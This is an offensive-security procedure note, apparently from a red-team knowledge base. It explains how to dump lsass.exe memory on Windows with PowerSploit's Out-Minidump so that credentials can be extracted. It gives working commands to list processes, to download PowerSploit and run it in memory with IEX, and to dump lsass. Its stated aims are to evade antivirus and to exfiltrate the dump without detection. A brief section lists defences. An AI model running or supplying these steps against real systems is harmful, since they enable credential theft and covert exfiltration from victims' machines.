---
type: procedure
verified: true
submitted: true
tactics:
  - '[[Collection]]'
techniques:
  - '[[Data from Local System]]'
tags:
  - memory-dump
  - powershell
  - data-exposure
platforms:
  - Windows
commands:
  - '[[commands/get-process-list-running-processes]]'
  - '[[commands/out-minidump-dump-process-memory]]'
tools:
  - '[[tools/PowerSploit]]'
validated: true
---

# dump-process-memory-using-powershell

## Summary

This procedure uses PowerShell and PowerSploit to dump the memory of a running process (e.g., lsass.exe) into a file for offline analysis, often to extract credentials or encryption keys.

## Description

Process memory dumps capture runtime state, including in-memory creds in lsass. PowerSploit's Out-Minidump creates mini-dumps without full crash, evading some AV. Run from WinRM shell; exfiltrate for tools like Mimikatz or strings.

## Requirements

- Administrative access on target (or SeDebugPrivilege)
- PowerSploit downloaded (Out-Minidump.ps1)
- Write access to output directory
- WinRM shell established

## Defense

- Enable Protected Process Light for lsass
- Monitor PowerShell execution (Module logging, AMSI)
- Detect large file creations or network exfil (ETW events)
- Use credential guard to isolate secrets

## Objectives

- Identify target process (e.g., lsass PID)
- Create dump file >100MB
- Exfiltrate without detection

## Instructions

### Step 1: List Running Processes

**Context**: In WinRM shell, enumerate processes to find target like lsass.exe.

**Command** ([[commands/get-process-list-running-processes]]):

```powershell
Get-Process
```

> Note PID/Name for sensitive procs (lsass for creds).

### Step 2: Import PowerSploit Module

**Context**: Download and load Out-Minidump.ps1.

Use IEX to load:

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Out-Minidump.ps1')
```

> Why: Provides the cmdlet without local files.

### Step 3: Dump Process Memory

**Context**: Pipe process to Out-Minidump; specify path.

**Command** ([[commands/out-minidump-dump-process-memory]]):

```powershell
Get-Process -Name lsass | Out-Minidump -DumpFilePath $_OUTPUT_PATH
```

> Creates .dmp; exfil via copy to SMB share.
